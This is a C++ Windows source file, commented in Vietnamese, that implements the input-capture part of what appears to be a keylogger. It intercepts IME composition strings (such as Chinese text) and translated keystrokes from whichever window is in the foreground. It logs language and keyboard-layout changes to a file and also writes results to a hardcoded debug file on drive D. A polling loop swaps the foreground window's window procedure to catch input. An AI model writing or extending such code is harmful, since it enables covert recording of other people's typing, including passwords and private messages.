#include "multilanguage.h"
#include "utils.h"
#include <imm.h>

#pragma comment(lib, "imm32.lib")

// Biến toàn cục để lưu trữ thông tin ngôn ngữ
LanguageInfo g_currentLanguage = { 0 };
HHOOK g_imeHook = NULL;

HWND g_foregroundWindow = NULL;
WNDPROC g_oldWndProc = NULL;

// Danh sách thông báo cần theo dõi cho IME
const UINT IME_MESSAGES[] = {
    WM_IME_STARTCOMPOSITION,
    WM_IME_ENDCOMPOSITION,
    WM_IME_COMPOSITION,
    WM_IME_NOTIFY,
    WM_IME_SETCONTEXT,
    WM_IME_CONTROL,
    WM_IME_COMPOSITIONFULL,
    WM_IME_SELECT,
    WM_IME_CHAR
};

LanguageInfo GetCurrentLanguageInfo() {
    LanguageInfo info = { 0 };

    // Lấy thread hiện tại
    DWORD threadId = GetCurrentThreadId();

    // Lấy layout bàn phím hiện tại
    info.keyboardLayout = GetKeyboardLayout(threadId);

    // Lấy ID ngôn ngữ
    info.languageId = LOWORD(info.keyboardLayout);

    // Kiểm tra IME có hoạt động không
    HWND hWnd = GetForegroundWindow();
    HIMC hImc = ImmGetContext(hWnd);

    if (hImc) {
        info.isImeActive = ImmGetOpenStatus(hImc);

        // Lấy chế độ chuyển đổi
        if (info.isImeActive) {
            ImmGetConversionStatus(hImc, &info.imeConvMode, NULL);
        }

        ImmReleaseContext(hWnd, hImc);
    }

    return info;
}

bool IsImeLanguage(HKL keyboardLayout) {
    LANGID langId = LOWORD(keyboardLayout);

    // Danh sách các ID ngôn ngữ IME phổ biến
    static const LANGID imeLanguages[] = {
        0x0411,  // Nhật Bản
        0x0412,  // Hàn Quốc
        0x0404,  // Trung Quốc (Đài Loan)
        0x0804,  // Trung Quốc (Giản thể)
        0x0C04,  // Trung Quốc (Hồng Kông)
        0x1004,  // Trung Quốc (Singapore)
        0x1404,  // Trung Quốc (Macao)
        0x0409   // Tiếng Anh (US) - Sẽ luôn trả về false
    };

    for (int i = 0; i < sizeof(imeLanguages) / sizeof(imeLanguages[0]) - 1; i++) {
        if (langId == imeLanguages[i]) {
            return true;
        }
    }

    return false;
}

std::wstring GetLanguageName(LANGID languageId) {
    WCHAR name[100] = { 0 };

    if (GetLocaleInfoW(languageId, LOCALE_SLANGUAGE, name, sizeof(name) / sizeof(WCHAR)) > 0) {
        return std::wstring(name);
    }

    // Fallback nếu không lấy được tên
    switch (languageId) {
    case 0x0411: return L"Japanese";
    case 0x0412: return L"Korean";
    case 0x0404: return L"Chinese (Traditional)";
    case 0x0804: return L"Chinese (Simplified)";
    case 0x0C04: return L"Chinese (Hong Kong)";
    case 0x1004: return L"Chinese (Singapore)";
    case 0x1404: return L"Chinese (Macao)";
    case 0x0409: return L"English (US)";
    default:     return L"Unknown";
    }
}

std::string Utf16ToUtf8(const std::wstring& wstr) {
    if (wstr.empty()) {
        return "";
    }

    // Tính kích thước cần thiết
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);

    if (size <= 0) {
        return "";
    }

    // Chuyển đổi
    std::vector<char> buffer(size);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, buffer.data(), size, NULL, NULL);

    return std::string(buffer.data(), buffer.size() - 1); // Trừ null terminator
}

std::wstring Utf8ToUtf16(const std::string& str) {
    if (str.empty()) {
        return L"";
    }

    // Tính kích thước cần thiết
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);

    if (size <= 0) {
        return L"";
    }

    // Chuyển đổi
    std::vector<wchar_t> buffer(size);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, buffer.data(), size);

    return std::wstring(buffer.data(), buffer.size() - 1); // Trừ null terminator
}

void WriteUnicode(const std::wstring& wstr) {
    if (!wstr.empty()) {
        // Chuyển về UTF-8 và ghi vào file
        std::string utf8Str = Utf16ToUtf8(wstr);
        Write(utf8Str);
    }
}

void UpdateImeStatus() {
    g_currentLanguage = GetCurrentLanguageInfo();

    // Ghi thông tin về ngôn ngữ khi thay đổi
    static HKL lastKeyboardLayout = 0;

    if (lastKeyboardLayout != g_currentLanguage.keyboardLayout) {
        std::wstring langName = GetLanguageName(g_currentLanguage.languageId);
        std::wstring logMsg = L"\n[LANGUAGE: " + langName + L"]\n";
        WriteUnicode(logMsg);

        lastKeyboardLayout = g_currentLanguage.keyboardLayout;
    }
}

std::wstring ExtractUnicodeCharFromKey(WPARAM virtualKey, BYTE keyState[256]) {
    wchar_t buffer[5] = { 0 };
    UINT scanCode = MapVirtualKey(virtualKey, MAPVK_VK_TO_VSC);

    HKL currentLayout = GetKeyboardLayout(0);

    // Chuyển đổi mã phím thành ký tự Unicode với keyboard layout hiện tại
    int result = ToUnicodeEx(
        virtualKey,
        scanCode,
        keyState,
        buffer,
        sizeof(buffer) / sizeof(buffer[0]) - 1,
        0,
        currentLayout  // Sử dụng layout hiện tại thay vì g_currentLanguage.keyboardLayout
    );

    if (result > 0) {
        return std::wstring(buffer, result);
    }

    return L"";
}

LRESULT CALLBACK ImeHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    MSG* msg = (MSG*)lParam;

    // Xử lý các thông báo IME
    if (msg && msg->message == WM_IME_COMPOSITION && (msg->lParam & GCS_RESULTSTR)) {
        HIMC hImc = ImmGetContext(msg->hwnd);
        if (hImc) {
            DWORD bufLen = ImmGetCompositionStringW(hImc, GCS_RESULTSTR, NULL, 0);
            if (bufLen > 0) {
                std::vector<wchar_t> buffer(bufLen / sizeof(wchar_t) + 1, 0);
                ImmGetCompositionStringW(hImc, GCS_RESULTSTR, buffer.data(), bufLen);

                // Ghi kết quả tiếng Trung
                std::wstring resultStr(buffer.data());
                WriteUnicode(resultStr);

                // Debug để xác nhận
                FILE* f = nullptr;
                errno_t err = fopen_s(&f, "D:\\ime_result.txt", "a");
                if (err == 0 && f != nullptr) {
                    fprintf(f, "IME Result: %ls\n", resultStr.c_str());
                    fclose(f);
                }
            }
            ImmReleaseContext(msg->hwnd, hImc);
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void LogCurrentLanguage() {
    HKL layout = GetKeyboardLayout(0);
    char layoutName[KL_NAMELENGTH];

    if (GetKeyboardLayoutNameA(layoutName)) {
        std::string msg = "\n[KEYBOARD LAYOUT: ";
        msg += layoutName;
        msg += "]\n";
        Write(msg);
    }
}

LRESULT CALLBACK IMEWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_IME_COMPOSITION && (lParam & GCS_RESULTSTR)) {
        HIMC hImc = ImmGetContext(hWnd);
        if (hImc) {
            DWORD len = ImmGetCompositionStringW(hImc, GCS_RESULTSTR, NULL, 0);
            if (len > 0) {
                wchar_t* buffer = new wchar_t[len / 2 + 1];
                ImmGetCompositionStringW(hImc, GCS_RESULTSTR, buffer, len);
                buffer[len / 2] = 0;

                // Ghi kết quả tiếng Trung
                WriteUnicode(std::wstring(buffer));

                delete[] buffer;
            }
            ImmReleaseContext(hWnd, hImc);
        }
    }

    return CallWindowProc(g_oldWndProc, hWnd, msg, wParam, lParam);
}

// Hàm theo dõi cửa sổ và thiết lập hook
void MonitorActiveWindow() {
    while (true) {
        HWND currentWindow = GetForegroundWindow();

        if (currentWindow != g_foregroundWindow) {
            // Bỏ hook cửa sổ cũ
            if (g_foregroundWindow && g_oldWndProc) {
                SetWindowLongPtr(g_foregroundWindow, GWLP_WNDPROC, (LONG_PTR)g_oldWndProc);
                g_oldWndProc = NULL;
            }

            // Hook cửa sổ mới
            g_foregroundWindow = currentWindow;
            if (g_foregroundWindow) {
                g_oldWndProc = (WNDPROC)SetWindowLongPtr(g_foregroundWindow,
                    GWLP_WNDPROC,
                    (LONG_PTR)IMEWndProc);
            }
        }

        Sleep(100); // Kiểm tra mỗi 100ms
    }
}